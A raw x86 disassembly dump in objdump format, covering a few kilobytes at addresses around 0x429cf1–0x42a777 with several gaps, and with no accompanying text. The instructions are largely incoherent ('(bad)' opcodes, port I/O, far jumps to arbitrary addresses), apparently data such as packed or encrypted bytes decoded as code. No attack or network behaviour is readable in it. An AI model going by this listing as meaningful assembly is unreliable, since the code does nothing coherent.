  429cf1:	mov    ebp,0xbff5d2ae
  429cf6:	push   0x35
  429cf8:	inc    edi
  429cf9:	jns    0x429ca6
  429cfb:	push   0x18f50e4c
  429d00:	ret    
  429d01:	enter  0x7754,0x6d
  429d05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d06:	daa    
  429d07:	push   edx
  429d08:	scas   al,BYTE PTR es:[edi]
  429d09:	adc    edx,DWORD PTR [bx+di+0x3cec]
  429d0e:	cmp    BYTE PTR [edx],cl
  429d10:	je     0x429d53
  429d12:	int    0x20
  429d14:	call   0x78e3a754
  429d19:	lods   al,BYTE PTR ds:[esi]
  429d1a:	adc    BYTE PTR [edx+0x73],dl
  429d1d:	or     ebx,DWORD PTR [eax]
  429d1f:	std    
  429d20:	out    0x17,al
  429d22:	scas   eax,DWORD PTR es:[edi]
  429d23:	add    al,0x66
  429d25:	sahf   
  429d26:	jecxz  0x429d16
  429d28:	pop    ecx
  429d29:	jno    0x429d3b
  429d2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d2c:	mov    eax,0xb2495215
  429d31:	dec    esp
  429d32:	fist   WORD PTR [esi+0x3bfcb34d]
  429d38:	(bad)  
  429d39:	sbb    ebx,DWORD PTR [ecx+0x3b]
  429d3c:	mov    BYTE PTR [edx+edx*4+0x50f02cff],cl
  429d43:	sti    
  429d44:	out    0xb2,eax
  429d46:	mov    cl,0xd6
  429d48:	cs mov ebx,edx
  429d4b:	dec    ebp
  429d4c:	pop    ecx
  429d4d:	cmp    BYTE PTR [ebx+ecx*8+0x4f],al
  429d51:	sub    al,0xf
  429d53:	dec    esp
  429d54:	mov    ds:0x899de2a9,eax
  429d59:	xchg   BYTE PTR [ecx-0x2902783b],bl
  429d5f:	lds    esi,FWORD PTR [esi+edi*4]
  429d62:	cmp    al,0xe1
  429d64:	mov    ds:0x44c73bae,eax
  429d69:	movd   DWORD PTR [esi-0x109c46f6],mm7
  429d70:	div    DWORD PTR [ecx+0x4d1809ee]
  429d76:	inc    esi
  429d77:	push   edx
  429d78:	out    dx,al
  429d79:	mov    ds:0x739d5a31,eax
  429d7e:	in     eax,0x99
  429d80:	jp     0x429dae
  429d82:	mov    ebp,0xefd3c634
  429d87:	dec    esi
  429d88:	xor    al,0xa6
  429d8a:	stos   BYTE PTR es:[edi],al
  429d8b:	aad    0x73
  429d8d:	inc    ecx
  429d8e:	in     eax,dx
  429d8f:	and    eax,0x46a2a38a
  429d94:	mov    edi,0x395310a
  429d99:	push   ecx
  429d9a:	cmp    esp,DWORD PTR [esi-0x2a]
  429d9d:	pop    esp
  429d9e:	enter  0x3dc1,0xf0
  429da2:	inc    esi
  429da3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429da4:	and    edi,DWORD PTR [eax+0x32d9bac1]
  429daa:	add    dl,dh
  429dac:	adc    eax,0x235a7df6
  429db1:	mov    WORD PTR [ecx+0x376f2325],ds
  429db7:	fsubrp st(0),st
  429db9:	push   ebx
  429dba:	add    al,0x1e
  429dbc:	out    dx,eax
  429dbd:	or     ch,dl
  429dbf:	sahf   
  429dc0:	cmc    
	...
  429e31:	add    BYTE PTR [eax],al
  429e33:	add    BYTE PTR [edi+0x5d],cl
  429e36:	pop    ecx
  429e37:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  429e3b:	fstp   QWORD PTR [eax+0x4d4e2ee0]
  429e41:	pop    ecx
  429e42:	popf   
  429e43:	adc    esp,ebp
  429e45:	mov    ebx,0xf50001
  429e4a:	add    BYTE PTR [eax],al
  429e4c:	jae    0x429ea8
  429e4e:	add    DWORD PTR [ecx-0x665b02cb],esp
  429e54:	mov    esi,0xa6cfc121
  429e59:	jnp    0x429df5
  429e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e5c:	sub    BYTE PTR [ecx],dh
  429e5e:	inc    ebp
  429e5f:	shl    DWORD PTR [ebx-0x254dc4cb],1
  429e65:	mov    ch,0x5a
  429e67:	dec    edx
  429e68:	adc    eax,0x4a5d8564
  429e6d:	adc    ebp,ecx
  429e6f:	dec    dl
  429e71:	dec    ecx
  429e72:	cmp    bl,bl
  429e74:	je     0x429ebd
  429e76:	cmp    DWORD PTR ds:0x67b2a70a,ebx
  429e7c:	sbb    ecx,DWORD PTR [ecx+0x552fd199]
  429e82:	(bad)  [edi]
  429e84:	mov    ds:0x16d67b79,eax
  429e89:	pop    edx
  429e8a:	popf   
  429e8b:	cli    
  429e8c:	(bad)  
  429e8d:	xor    al,0xcf
  429e8f:	jns    0x429e79
  429e91:	dec    eax
  429e92:	adc    BYTE PTR ds:0x79fb5b36,ah
  429e98:	call   0xdb90:0x3e3f38ab
  429e9f:	out    dx,eax
  429ea0:	jle    0x429f11
  429ea2:	jne    0x429e98
  429ea4:	push   0x18
  429ea6:	pop    esp
  429ea7:	push   0x68186cb4
  429eac:	out    dx,eax
  429ead:	cli    
  429eae:	pushf  
  429eaf:	aam    0xcd
  429eb1:	xor    edx,ebp
  429eb3:	pushf  
  429eb4:	repnz popf 
  429eb6:	xchg   esp,eax
  429eb7:	dec    ecx
  429eb8:	dec    esi
  429eb9:	call   0xd01e6bc8
  429ebe:	pushf  
  429ebf:	in     al,0xf8
  429ec1:	jo     0x429eb6
  429ec3:	pushf  
  429ec4:	xchg   edx,eax
  429ec5:	adc    esp,esi
  429ec7:	in     eax,0x2b
  429ec9:	xchg   esi,eax
  429eca:	xchg   ecx,eax
  429ecb:	add    dh,BYTE PTR [eax+eax*1+0x4a37c4a0]
  429ed2:	repnz cmc 
  429ed4:	out    0x25,eax
  429ed6:	xchg   esp,eax
  429ed7:	mov    al,0x55
  429ed9:	outs   dx,DWORD PTR ds:[esi]
  429edb:	jbe    0x429ec8
  429edd:	out    dx,eax
  429ede:	(bad)  
  429edf:	ficomp DWORD PTR [ebx+0xeee5143]
  429ee5:	sti    
  429ee6:	out    0xa1,al
  429ee8:	fist   WORD PTR [edx]
  429eea:	adc    BYTE PTR [eax-0x38473c73],dh
  429ef0:	fcom   DWORD PTR [ebx]
  429ef2:	out    0x1f,al
  429ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ef5:	fs pop ecx
  429ef7:	test   al,0xf0
  429ef9:	xor    BYTE PTR [ebp+0x11],cl
  429efc:	pop    eax
  429efd:	dec    DWORD PTR [eax+0x45951cd7]
  429f03:	jbe    0x429f0f
  429f05:	popf   
  429f06:	cmp    eax,DWORD PTR [edi-0x38]
  429f09:	rcl    esp,cl
  429f0b:	inc    eax
  429f0c:	mov    dl,0xbc
  429f0e:	jmp    0x60ea09d3
  429f13:	sbb    ebx,ecx
  429f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f16:	pop    edi
  429f17:	mov    cl,0x9a
  429f19:	sub    ebx,edx
  429f1b:	xchg   esi,eax
  429f1c:	aaa    
  429f1d:	adc    ebp,0x2
  429f20:	imul   edx,esp,0x550cf0ed
  429f26:	in     eax,0x68
  429f28:	mov    ch,0x18
  429f2a:	sbb    ebp,edx
  429f2c:	push   0xee723700
  429f31:	pop    esi
  429f32:	mov    esp,0x94068eac
  429f37:	cdq    
  429f38:	fld    TBYTE PTR [edx]
  429f3a:	ror    BYTE PTR [ebx+ecx*1],cl
  429f3d:	in     al,0xc
  429f3f:	mov    ah,dh
	...
  429fb1:	add    BYTE PTR [eax],al
  429fb3:	add    cl,ah
  429fb5:	in     al,dx
  429fb6:	mov    ebx,es
  429fb8:	(bad)  
  429fb9:	jecxz  0x429faa
  429fbb:	out    dx,al
  429fbc:	sub    dh,BYTE PTR [eax+0x1e086d7b]
  429fc2:	in     eax,dx
  429fc3:	mov    ch,0xe1
  429fc5:	mov    esp,0xf50001
  429fca:	add    BYTE PTR [eax],al
  429fcc:	scas   eax,DWORD PTR es:[edi]
  429fcd:	xchg   ebx,eax
  429fce:	outs   dx,DWORD PTR ds:[esi]
  429fcf:	ror    BYTE PTR [esi],cl
  429fd1:	mov    bh,0xba
  429fd3:	jmp    0xe8b3:0xd762c3ab
  429fda:	dec    ebp
  429fdb:	jbe    0x429fd0
  429fdd:	in     eax,dx
  429fde:	mov    ah,0x38
  429fe0:	cwde   
  429fe1:	jbe    0x42a052
  429fe3:	(bad)  
  429fe4:	mov    ch,0x80
  429fe6:	dec    edi
  429fe7:	aad    0xc5
  429fe9:	pop    esp
  429fea:	jae    0x42a03d
  429fec:	(bad)  
  429fed:	jbe    0x429f8c
  429fef:	bound  ebx,QWORD PTR [edi]
  429ff1:	ret    0x8b0b
  429ff4:	jp     0x42a063
  429ff6:	test   DWORD PTR [edx+0x6eda04e7],ebp
  429ffc:	jae    0x429fd3
  429ffe:	das    
  429fff:	jge    0x429f84
  42a001:	xor    al,0xca
  42a003:	pop    edx
  42a004:	cmp    BYTE PTR [edx],bh
  42a006:	jmp    0x2c5a:0xa0792c28
  42a00d:	jge    0x42a04f
  42a00f:	cmp    ebx,DWORD PTR [ecx+0x48]
  42a012:	inc    esi
  42a013:	dec    edx
  42a014:	sub    DWORD PTR [edx-0xa],esp
  42a017:	addr16 jl 0x429fa7
  42a01a:	sti    
  42a01b:	(bad)  
  42a01c:	std    
  42a01d:	nop
  42a01e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a01f:	(bad)  
  42a020:	jnp    0x42a072
  42a022:	out    0xcc,al
  42a024:	(bad)  
  42a025:	and    ebp,0xfffffff8
  42a028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a029:	or     BYTE PTR [ecx+esi*8],dl
  42a02c:	mov    esi,0xae1a3aa1
  42a031:	mov    al,ds:0x8e84a995
  42a036:	shl    BYTE PTR [ecx-0x1dd8822c],cl
  42a03c:	pop    ebp
  42a03d:	xchg   esi,eax
  42a03e:	add    BYTE PTR [esi+0x85d4495],ch
  42a044:	fidivr WORD PTR [ebx+0x6a]
  42a047:	in     al,dx
  42a048:	cs mov ah,0xc
  42a04b:	jle    0x42a054
  42a04d:	pop    edi
  42a04e:	(bad)  
  42a04f:	or     DWORD PTR [edx-0x4d717002],ecx
  42a055:	(bad)  
  42a056:	lahf   
  42a057:	enter  0x963a,0x14
  42a05b:	pop    ebp
  42a05c:	push   ebx
  42a05d:	mov    dh,0x13
  42a05f:	(bad)  
  42a060:	jnp    0x42a0a8
  42a062:	add    BYTE PTR [eax-0x577e6a08],dl
  42a068:	rcr    BYTE PTR [eax],1
  42a06a:	jns    0x42a0be
  42a06c:	mov    al,ds:0xcf437d13
  42a071:	xchg   edi,eax
  42a072:	pop    es
  42a073:	add    ecx,DWORD PTR [ebx]
  42a075:	xchg   BYTE PTR [edx],cl
  42a077:	jp     0x42a0e7
  42a079:	ins    BYTE PTR es:[edi],dx
  42a07a:	jb     0x42a05a
  42a07c:	(bad)  
  42a07d:	fisubr DWORD PTR [edi-0x21b6dd6d]
  42a083:	cmp    cl,BYTE PTR [eax-0x26]
  42a086:	pop    es
  42a087:	push   esi
  42a088:	push   esi
  42a089:	xor    cl,BYTE PTR [eax-0x1f]
  42a08c:	pusha  
  42a08d:	add    al,0x5b
  42a08f:	daa    
  42a090:	mov    al,ds:0x100b6018
  42a095:	jmp    0xa43f9cbc
  42a09a:	inc    esp
  42a09b:	(bad)  
  42a09c:	ja     0x42a0da
  42a09e:	inc    edx
  42a09f:	sub    bh,BYTE PTR [edi+0x1198baf3]
  42a0a5:	jmp    0x2c30cd01
  42a0aa:	adc    esp,DWORD PTR [edi]
  42a0ac:	shl    BYTE PTR [eax-0x57],1
  42a0af:	clc    
  42a0b0:	jo     0x42a0e2
  42a0b2:	sahf   
  42a0b3:	and    BYTE PTR [edi+0x39],ah
  42a0b6:	js     0x42a0ee
  42a0b8:	jmp    0x91481cb8
  42a0bd:	mov    BYTE PTR [eax+0x7a8],al
	...
  42a133:	add    BYTE PTR [esi-0x79],dl
  42a136:	std    
  42a137:	test   ch,bh
  42a139:	(bad)  
  42a13a:	jg     0x42a113
  42a13c:	jbe    0x42a105
  42a13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a13f:	(bad)  
  42a140:	push   0xffffff80
  42a142:	mov    DWORD PTR [edx+0x1bdd6],edi
  42a148:	cmc    
  42a149:	add    BYTE PTR [eax],al
  42a14b:	add    BYTE PTR [esi],bh
  42a14d:	adc    bl,BYTE PTR [edi]
  42a14f:	jp     0x42a16a
  42a151:	popf   
  42a152:	pop    eax
  42a153:	adc    bl,BYTE PTR ss:[ebx+0x4e5636a8]
  42a15a:	jo     0x42a137
  42a15c:	loope  0x42a1c6
  42a15e:	gs push ss
  42a160:	arpl   WORD PTR [edi+eiz*1],cx
  42a163:	push   edi
  42a164:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a165:	mov    ch,0xab
  42a167:	pop    esi
  42a168:	je     0x42a156
  42a16a:	xchg   ecx,eax
  42a16b:	mov    WORD PTR [ebp+0x35],fs
  42a16e:	pop    edx
  42a16f:	stc    
  42a170:	in     al,dx
  42a171:	sbb    eax,0x6e2873d2
  42a176:	(bad)
  42a179:	sbb    BYTE PTR [eax-0x3a104226],dh
  42a17f:	das    
  42a180:	push   ss
  42a181:	cwde   
  42a182:	iret   
  42a183:	mov    WORD PTR [eax-0x77],ss
  42a186:	sub    DWORD PTR [edi],edi
  42a188:	jg     0x42a133
  42a18a:	lea    eax,[ebp+0x19]
  42a18d:	out    0xd4,eax
  42a18f:	and    BYTE PTR [ebx-0x4d6c80cd],0x55
  42a196:	loope  0x42a1f3
  42a198:	aaa    
  42a199:	ret    0xe983
  42a19c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a19d:	sahf   
  42a19e:	and    ch,BYTE PTR [ecx-0x9]
  42a1a1:	and    eax,0xe24a2d76
  42a1a6:	lahf   
  42a1a7:	int3   
  42a1a8:	push   es
  42a1a9:	add    al,0x1e
  42a1ab:	push   esp
  42a1ac:	mov    dl,0xff
  42a1ae:	nop
  42a1af:	mov    bl,0x9d
  42a1b1:	jmp    0x4ce8fed2
  42a1b6:	dec    esi
  42a1b7:	(bad)  
  42a1b8:	dec    esp
  42a1b9:	sub    eax,0x721f4634
  42a1be:	cdq    
  42a1bf:	in     eax,0xe5
  42a1c1:	fcomp  DWORD PTR [eax]
  42a1c3:	cwde   
  42a1c4:	les    eax,FWORD PTR [edx-0x25]
  42a1c7:	retf   
  42a1c8:	jecxz  0x42a17d
  42a1ca:	jle    0x42a1ab
  42a1cc:	sbb    al,0xc8
  42a1ce:	lds    edx,FWORD PTR [esi-0x77574832]
  42a1d4:	dec    ebp
  42a1d5:	push   ss
  42a1d6:	(bad)  
  42a1d7:	popf   
  42a1d8:	out    dx,eax
  42a1d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a1da:	mov    ebp,DWORD PTR [ebx+0x15]
  42a1dd:	and    DWORD PTR [ecx-0x7454b6b6],ebx
  42a1e3:	mov    ds:0x6cabd61e,al
  42a1e8:	mov    bh,BYTE PTR [eax+0x6f]
  42a1eb:	(bad)  
  42a1ed:	jno    0x42a229
  42a1ef:	dec    edi
  42a1f0:	and    DWORD PTR [ebx],ecx
  42a1f2:	push   esi
  42a1f3:	imul   ebx,DWORD PTR [eax],0xffffffd4
  42a1f6:	push   es
  42a1f7:	xchg   esp,eax
  42a1f8:	ret    0x45e6
  42a1fb:	sbb    eax,0x720ff83e
  42a200:	sub    BYTE PTR [eax],0x5e
  42a203:	outs   dx,DWORD PTR ds:[esi]
  42a204:	cmp    al,0x4
  42a206:	dec    edx
  42a207:	push   es
  42a208:	and    eax,0x7c274b39
  42a20d:	push   esp
  42a20e:	icebp  
  42a20f:	imul   ebx,eax,0x4bd947cf
  42a215:	push   ecx
  42a216:	adc    dh,BYTE PTR [ebx+0x6c]
  42a219:	icebp  
  42a21a:	inc    ebx
  42a21b:	cdq    
  42a21c:	jp     0x42a1c7
  42a21e:	xor    cl,BYTE PTR [edi-0x57]
  42a221:	icebp  
  42a222:	jns    0x42a1e0
  42a224:	es adc al,0x4a
  42a227:	sub    edx,DWORD PTR [esi+ecx*1]
  42a22a:	add    BYTE PTR [eax-0x607a76c],ah
  42a230:	mov    eax,ds:0xe226be28
  42a235:	ins    BYTE PTR es:[edi],dx
  42a236:	adc    cl,BYTE PTR [ecx-0x62]
  42a239:	sub    ebx,DWORD PTR [esi-0x50b36c81]
  42a23f:	sub    ah,BYTE PTR [eax+eax*1]
	...
  42a2b2:	add    BYTE PTR [eax],al
  42a2b4:	lock adc al,0xe1
  42a2b7:	(bad)  
  42a2b8:	in     eax,0xff
  42a2ba:	call   FWORD PTR [esi]
  42a2bc:	xor    eax,0x927f8ab9
  42a2c1:	inc    ebp
  42a2c2:	mov    eax,0x1becb00
  42a2c7:	add    ch,dh
  42a2c9:	add    BYTE PTR [eax],al
  42a2cb:	add    BYTE PTR [esi],bl
  42a2cd:	fidivr DWORD PTR [ebp-0x2d]
  42a2d0:	add    DWORD PTR [edx+0x7c34bd4d],edx
  42a2d6:	mov    dh,0xdd
  42a2d8:	xchg   ebp,eax
  42a2d9:	push   0xeb0acc41
  42a2de:	lock sbb eax,0x202d0846
  42a2e4:	clc    
  42a2e5:	pusha  
  42a2e6:	push   ss
  42a2e7:	mov    ch,0xf9
  42a2e9:	mov    bl,0xe
  42a2eb:	scas   al,BYTE PTR es:[edi]
  42a2ec:	shl    DWORD PTR [ecx+0xa2f686b],cl
  42a2f2:	rcr    BYTE PTR [ecx],0x71
  42a2f5:	push   eax
  42a2f6:	shr    eax,0xe7
  42a2f9:	mov    BYTE PTR [ebx+0x7f],bh
  42a2fc:	in     al,0x2f
  42a2fe:	xor    al,0xd2
  42a300:	pop    ecx
  42a301:	loop   0x42a348
  42a303:	add    al,0x3b
  42a305:	ror    DWORD PTR [ebx-0x5e64a268],0x15
  42a30c:	push   0x6c
  42a30e:	jae    0x42a379
  42a310:	xor    DWORD PTR [eax-0x79],ebx
  42a313:	cmp    eax,0xe64f21b
  42a318:	(bad)  
  42a319:	rcr    DWORD PTR [esi],0x25
  42a31c:	mov    esi,0x2e422b60
  42a321:	mov    bh,0x3
  42a324:	cmp    DWORD PTR [esi-0x67],0x8039180b
  42a32b:	outs   dx,BYTE PTR ds:[esi]
  42a32c:	pop    ss
  42a32d:	(bad)  
  42a32e:	rcl    bl,0x91
  42a331:	mov    edi,0xdc214cc7
  42a336:	sti    
  42a337:	sub    eax,0x956ade7f
  42a33c:	fld    st(0)
  42a33e:	loope  0x42a33e
  42a340:	fisubr DWORD PTR [ebx-0x33c240dc]
  42a346:	push   cs
  42a347:	lock xor BYTE PTR [ebx-0x10],0x4
  42a34c:	int3   
  42a34d:	mov    esp,0xb599fce7
  42a352:	xchg   DWORD PTR [edx],ebx
  42a354:	add    al,0x83
  42a356:	cwde   
  42a357:	sbb    eax,0x515eb235
  42a35c:	unpcklps xmm4,XMMWORD PTR [edx-0x7b]
  42a360:	lea    edi,ds:0x1d7714ea
  42a366:	std    
  42a367:	loop   0x42a3a7
  42a369:	dec    edi
  42a36a:	fs dec eax
  42a36c:	or     dl,bh
  42a36e:	leave  
  42a36f:	js     0x42a303
  42a371:	adc    ah,bl
  42a373:	(bad)  
  42a374:	fistp  QWORD PTR [edx-0x5d]
  42a377:	in     eax,0xb8
  42a379:	(bad)  
  42a37a:	jecxz  0x42a3d7
  42a37c:	dec    ebx
  42a37d:	ss cmp al,0x74
  42a380:	std    
  42a381:	sub    ebp,DWORD PTR [esp+eax*1+0x57872f52]
  42a388:	call   0x4d4d7ab4
  42a38d:	inc    BYTE PTR [eax+0x5fc8aa8f]
  42a393:	lea    eax,[edi+0x61]
  42a396:	pop    esp
  42a397:	or     al,0x4d
  42a399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a39a:	into   
  42a39b:	dec    esp
  42a39c:	in     al,dx
  42a39d:	or     eax,0x13aaefd0
  42a3a2:	xchg   ecx,eax
  42a3a3:	shl    DWORD PTR [edx],cl
  42a3a5:	call   0x29fd:0x6197bc08
  42a3ac:	mov    bl,0x4c
  42a3ae:	pop    esp
  42a3af:	cmp    eax,0x68d6b474
  42a3b4:	mov    ds:0xfdcb1bd4,al
  42a3b9:	clc    
  42a3ba:	mov    esi,0x7e182425
  42a3bf:	mov    cl,0x54
	...
  42a431:	add    BYTE PTR [eax],al
  42a433:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  42a437:	sub    al,0x53
  42a439:	ds jg  0x42a4a9
  42a43c:	stos   BYTE PTR es:[edi],al
  42a43d:	dec    ebx
  42a43e:	push   edi
  42a43f:	jo     0x42a3f1
  42a441:	or     al,0x1d
  42a443:	stc    
  42a444:	sar    BYTE PTR [edi+0xf50001],0x0
  42a44b:	add    bl,bh
  42a44d:	repnz mov edi,0xffb73b72
  42a453:	jne    0x42a406
  42a455:	std    
  42a456:	out    0xd8,al
  42a458:	arpl   WORD PTR [ecx-0x28237404],cx
  42a45e:	test   eax,0x10565322
  42a463:	(bad)  [ecx+0x70]
  42a466:	jnp    0x42a4d2
  42a468:	ud2    
  42a46a:	leave  
  42a46b:	add    al,0xbb
  42a46d:	mov    ecx,0xa6303d4f
  42a472:	adc    DWORD PTR [ebx],esp
  42a474:	jmp    FWORD PTR [eax+eax*2]
  42a477:	retf   
  42a478:	test   al,0x2d
  42a47a:	imul   ebp,DWORD PTR [ebx-0x4f9f9622],0xffffffa0
  42a481:	fild   DWORD PTR [edx-0x76fd6f26]
  42a487:	sbb    ecx,esp
  42a489:	cmp    eax,0xdc74e4f7
  42a48e:	scas   eax,DWORD PTR es:[edi]
  42a48f:	xor    ecx,DWORD PTR [eax]
  42a491:	and    ah,BYTE PTR [edx]
  42a493:	lods   al,BYTE PTR ds:[esi]
  42a494:	jmp    0x9625ad6d
  42a499:	test   ah,cl
  42a49b:	cmc    
  42a49c:	jmp    0xb3f71292
  42a4a1:	(bad)  
  42a4a3:	pop    eax
  42a4a4:	ins    DWORD PTR es:[edi],dx
  42a4a5:	je     0x42a46f
  42a4a7:	loope  0x42a47c
  42a4a9:	and    BYTE PTR [ecx-0x41bc1275],dl
  42a4af:	adc    bl,BYTE PTR [ebp+0x6f]
  42a4b2:	popa   
  42a4b3:	mov    bl,ch
  42a4b5:	pusha  
  42a4b6:	mov    cl,0x37
  42a4b8:	imul   DWORD PTR [edi-0x1dddf87a]
  42a4be:	and    al,0x3c
  42a4c0:	sub    al,0xd6
  42a4c2:	mov    esp,0x38bf5766
  42a4c7:	adc    eax,0x4157af64
  42a4cc:	jmp    0x3ac9:0x3a85112b
  42a4d3:	data16 jbe 0x42a47b
  42a4d6:	cmp    bh,BYTE PTR [edx+edi*4+0x23b9a0d0]
  42a4dd:	push   ds
  42a4de:	ins    BYTE PTR es:[edi],dx
  42a4df:	(bad)  
  42a4e0:	or     dl,cl
  42a4e2:	pop    ebp
  42a4e4:	iret   
  42a4e5:	into   
  42a4e6:	dec    ebx
  42a4e7:	pop    esi
  42a4e8:	test   BYTE PTR [edx],al
  42a4ea:	scas   al,BYTE PTR es:[edi]
  42a4eb:	cs cld 
  42a4ed:	sbb    eax,0x94ff3425
  42a4f2:	retf   
  42a4f3:	mov    al,0x2c
  42a4f5:	retf   0xb429
  42a4f8:	loop   0x42a519
  42a4fa:	add    bl,BYTE PTR [esi+0x731683e9]
  42a500:	pop    esp
  42a501:	pop    ebx
  42a502:	push   ebp
  42a503:	std    
  42a504:	int3   
  42a505:	not    BYTE PTR [ebx-0x8]
  42a508:	jp     0x42a542
  42a50a:	push   eax
  42a50b:	sahf   
  42a50c:	or     BYTE PTR [esi],dl
  42a50e:	or     eax,0x75ed069b
  42a513:	imul   esi,DWORD PTR [ebx],0xc5fe87e7
  42a519:	xchg   ebp,eax
  42a51a:	jb     0x42a526
  42a51c:	and    DWORD PTR [eax],eax
  42a51e:	cmp    DWORD PTR [edx-0x504a07cf],0xa8a307c7
  42a528:	mov    ch,0xc8
  42a52a:	inc    edi
  42a52b:	mov    DWORD PTR [edi-0x3a5a76b6],ecx
  42a531:	cmc    
  42a532:	push   0xcd144e93
  42a537:	sub    edx,DWORD PTR [eax]
  42a539:	pop    ds
  42a53a:	mov    al,0xe2
  42a53c:	push   es
  42a53d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a53e:	adc    eax,0xe9cb
	...
  42a5b3:	add    BYTE PTR [ebp+0x1d],ch
  42a5b6:	out    0xc0,al
  42a5b8:	idiv   bl
  42a5ba:	outs   dx,DWORD PTR ds:[esi]
  42a5bb:	mov    ebp,0x44d94d2c
  42a5c0:	mov    WORD PTR [ecx-0x3f4aec11],?
  42a5c6:	add    DWORD PTR [eax],eax
  42a5c8:	cmc    
  42a5c9:	add    BYTE PTR [eax],al
  42a5cb:	add    BYTE PTR ds:0xa5f2362c,cl
  42a5d1:	or     cl,al
  42a5d3:	aad    0x8d
  42a5d5:	jmp    0x42a565
  42a5d7:	sub    eax,DWORD PTR ds:0xe02ce081
  42a5dd:	sar    ebx,cl
  42a5df:	addr16 ret 0x29cc
  42a5e3:	outs   dx,BYTE PTR ds:[esi]
  42a5e4:	jmp    0x4e25:0x892abf
  42a5eb:	dec    ecx
  42a5ec:	pop    esp
  42a5ed:	xchg   edx,eax
  42a5ee:	pusha  
  42a5ef:	adc    BYTE PTR [ebx+0x14],bl
  42a5f2:	jnp    0x42a59e
  42a5f4:	xchg   esi,eax
  42a5f5:	sub    ebx,esi
  42a5f7:	imul   ebx,ecx,0x801bf718
  42a5fd:	push   edx
  42a5fe:	jp     0x42a5a1
  42a600:	pop    edi
  42a601:	sbb    DWORD PTR [eax+0x3c29f5d1],0xb8c044d1
  42a60b:	xor    eax,0xd37897d1
  42a610:	mov    eax,0xc5e65ff4
  42a615:	and    ecx,DWORD PTR [edi+0x0]
  42a618:	lods   eax,DWORD PTR ds:[esi]
  42a619:	scas   eax,DWORD PTR es:[edi]
  42a61a:	jecxz  0x42a616
  42a61c:	add    cx,WORD PTR [edi-0x5fa9dd39]
  42a623:	into   
  42a624:	data16 (bad) 
  42a626:	not    BYTE PTR [edi-0x1c]
  42a629:	jno    0x42a611
  42a62b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a62c:	fild   DWORD PTR [ebx-0x7df0ff53]
  42a632:	out    dx,eax
  42a633:	(bad)  
  42a634:	addr16 push ebx
  42a636:	pushf  
  42a637:	jmp    0x42a67e
  42a639:	mov    ?,WORD PTR [ebp-0x2f]
  42a63c:	loope  0x42a5c7
  42a63e:	or     esi,edx
  42a640:	add    eax,0x37ee2938
  42a645:	pop    ebx
  42a646:	rcl    DWORD PTR [edi+0x6e],0x92
  42a64a:	pop    eax
  42a64b:	dec    ecx
  42a64c:	repz mov bl,0x56
  42a64f:	lds    ebp,FWORD PTR [eax-0x59]
  42a652:	adc    BYTE PTR [esi-0x1b],0xec
  42a656:	in     al,0x59
  42a658:	test   BYTE PTR [esi-0x29],dl
  42a65b:	mov    eax,ds:0xfa741b27
  42a660:	and    al,0x28
  42a662:	(bad)  
  42a663:	or     al,0x4a
  42a665:	pusha  
  42a666:	sti    
  42a667:	sar    BYTE PTR cs:[edi-0x58a5af8e],0x70
  42a66f:	or     al,0xcb
  42a671:	leave  
  42a672:	out    0x38,eax
  42a674:	push   esi
  42a675:	push   es
  42a676:	mov    ds:0xd2f44e22,al
  42a67b:	inc    esp
  42a67c:	pop    es
  42a67d:	in     eax,dx
  42a67e:	pop    edx
  42a67f:	fisttp WORD PTR [ebx]
  42a681:	mov    WORD PTR [ebx+0x15],ss
  42a684:	js     0x42a624
  42a686:	mov    eax,ds:0x9c556f54
  42a68b:	dec    ebx
  42a68c:	into   
  42a68d:	push   cs
  42a68e:	outs   dx,DWORD PTR ds:[esi]
  42a68f:	ins    DWORD PTR es:[edi],dx
  42a690:	sub    DWORD PTR [ebp-0x47],esi
  42a693:	inc    eax
  42a694:	push   edx
  42a695:	out    0xf7,al
  42a697:	pop    ebp
  42a698:	ja     0x42a63c
  42a69a:	sub    eax,0x11e0bd41
  42a69f:	in     eax,0x3e
  42a6a1:	leave  
  42a6a2:	mov    bl,0xd1
  42a6a4:	xchg   esi,eax
  42a6a5:	xor    eax,0xcc0bdcb2
  42a6aa:	adc    DWORD PTR [ebx-0x17],esi
  42a6ad:	ret    
  42a6ae:	rol    DWORD PTR [ecx-0x47],cl
  42a6b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a6b2:	mov    al,ds:0x64362e2b
  42a6b7:	daa    
  42a6b8:	aam    0xc8
  42a6ba:	clc    
  42a6bb:	jns    0x42a6a8
  42a6bd:	stos   BYTE PTR es:[edi],al
  42a6be:	cs and al,0xbd
	...
  42a731:	add    BYTE PTR [eax],al
  42a733:	add    BYTE PTR [eax],dh
  42a735:	inc    edx
  42a736:	fbld   TBYTE PTR [edx-0x1]
  42a739:	(bad)  
  42a73a:	mov    ebp,0xffb84452
  42a73f:	cdq    
  42a740:	jbe    0x42a79d
  42a742:	(bad)  
  42a743:	add    ebp,DWORD PTR [edx-0xafffe3f]
  42a749:	add    BYTE PTR [eax],al
  42a74b:	add    BYTE PTR [esi-0x2931e230],al
  42a751:	mov    ecx,0xe725ffe3
  42a756:	sbb    BYTE PTR ds:0x895b7ae5,dl
  42a75c:	inc    esi
  42a75d:	xchg   cl,ah
  42a75f:	mov    al,0x76
  42a761:	loopne 0x42a74b
  42a763:	loope  0x42a752
  42a765:	ins    DWORD PTR es:[edi],dx
  42a766:	out    0x47,al
  42a768:	or     al,0xc2
  42a76a:	mov    dh,BYTE PTR [eax-0x65d3422a]
  42a770:	mov    al,ds:0xa8302e51
  42a775:	cmp    ah,BYTE PTR [ebx]
  42a777:	pop    edi
